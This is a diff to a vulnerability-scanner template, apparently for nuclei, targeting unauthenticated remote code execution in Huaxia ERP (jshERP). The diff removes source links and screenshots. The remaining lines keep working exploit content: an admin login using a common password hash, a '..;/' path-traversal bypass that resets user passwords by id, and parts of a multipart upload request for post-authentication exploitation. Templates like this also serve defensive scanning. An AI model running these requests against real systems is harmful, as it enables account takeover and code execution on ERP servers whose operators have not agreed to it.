@@ -3,13 +3,8 @@ info:
   name: 华夏ERP全版本未授权RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gtt3ab4dyg2b5mbt
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gtt3ab4dyg2b5mbt
 http:
 - raw:
   - 'POST /jshERP-boot/user/login HTTP/1.1
@@ -48,15 +43,7 @@ http:
     Connection: close
 
 
-
-
     {"loginName":"admin","password":"e10adc3949ba59abbe56e057f20f883e"}
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1725844453555-b84f6a84-0391-4408-a756-758561b20416.png)
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1725844453836-5a3054e4-5d96-4f8f-878a-b7cf448e9630.png)
 
 
     ### 权限绕过重置用户密码
@@ -64,12 +51,7 @@ http:
     /jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/resetPwd
 
 
-
-
     {"id":63}
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1725844454151-662ab8a5-a21f-4413-a4ce-76d2bb04db79.png)
 
 
     ## 后台利用
@@ -111,10 +93,6 @@ http:
     Content-Length: 247
 
 
-
-
-
-
     -----------------------------64343665641219398361207370473
 
 
@@ -124,11 +102,7 @@ http:
     Content-Type: text/plain
 
 
-
-
     success
-
-
 
 
     -----------------------------64343665641219398361207370473--
